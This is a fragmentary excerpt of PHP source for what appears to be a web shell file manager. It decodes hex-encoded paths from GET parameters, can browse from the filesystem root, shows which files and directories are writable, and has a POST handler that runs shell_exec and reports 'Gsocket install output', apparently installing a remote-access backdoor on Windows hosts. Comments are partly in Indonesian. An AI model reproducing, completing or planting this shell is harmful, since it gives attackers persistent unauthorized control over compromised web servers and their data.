...
function D($encoded)
{
    ...
    if (strlen($hex) % 2 !== 0 || !preg_match("/^[0-9a-fA-F]+$/", $hex)) { 
        return false;
    }
    return hex2bin($hex);
}
...
$shell_dir = realpath(gWD());
$base_dir = stristr(PHP_OS, 'WIN') ? realpath(gWD()) : '/';
...
function is_path_safe($path, $base) {
    ...
    if (!stristr(PHP_OS, 'WIN') && $real_path === '/') {
        return true;
    }
...
$path_encoded = $_GET['path'] ?? E($shell_dir);
$path = D($path_encoded);
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (stristr(PHP_OS, 'WIN')) {
        ...
        if (!function_exists('shell_exec') || !is_callable('shell_exec')) {
            $message = 'Error: shell_exec is disabled on this server.';
            $status = 'error';
        } else {
            ...
            // Karena shell_exec bisa return NULL, tangani itu
            if ($output === null) {
                $message = 'Command execution failed or disabled.';
                $status = 'error';
            } else {
                $message = "Gsocket install output:<br><pre>" . htmlspecialchars($output) . "</pre>";
                $status = 'success';
            }
        }
    }
...
<body>
    <div class="container">
        ...
        <nav class="breadcrumb" aria-label="Breadcrumb navigation" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
            ...
            <a href="?path=<?php echo E($shell_dir); ?>" style="color:#4fc3f7; font-weight:600; background:#37474f; padding:5px 10px; border-radius:6px; text-decoration:none;">
        ...
        <section class="server-info" aria-label="Server Information">
            ...
            <div>
                <strong>Writeable:</strong>
                <span style="color: <?php echo $is_writable ? '#4caf50' : '#f44336'; ?>; font-weight: bold;">
                ...
                <tbody>
                    ...
                    if ($files !== false) {
                        foreach ($files as $file) {
                            ...
                            $is_writeable_item = is_writable($fullPath);
                            $type_color = $is_writeable_item ? '#4caf50' : '#f44336';
                            $type_text = $isDir ? 'Directory' : 'File';
                            echo '<td style="color: ' . $type_color . '; font-weight: bold;">' . $type_text . '</td>';
                            echo '<td>' . $size . '</td>';
                            echo '<td>' . $perms . '</td>';
                            echo '<td>';
                            if (!$isDir) {
